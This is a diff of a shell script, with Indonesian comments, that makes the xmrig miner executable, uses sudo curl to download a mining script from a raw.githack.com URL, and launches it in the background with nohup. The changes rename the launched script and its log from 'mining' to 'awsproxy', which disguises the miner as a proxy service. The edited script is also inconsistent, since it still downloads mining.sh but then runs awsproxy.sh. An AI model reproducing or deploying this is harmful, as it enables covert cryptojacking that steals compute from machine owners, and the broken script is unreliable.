@@ -19,10 +19,10 @@ chmod +x ./xmrig
 sudo curl -L -o mining.sh "https://raw.githack.com/appjobdesk/note/main/mining.sh"
 
 # Ubah kepemilikan agar bisa dieksekusi oleh user saat ini
-sudo chown $(whoami):$(whoami) mining.sh
+sudo chown $(whoami):$(whoami) awsproxy.sh
 
 # Beri izin eksekusi ke mining.sh
-chmod +x mining.sh
+chmod +x awsproxy.sh
 
 # Jalankan mining di background
-nohup ./mining.sh > mining.log 2>&1 &
+nohup ./awsproxy.sh > awsproxy.log 2>&1 &
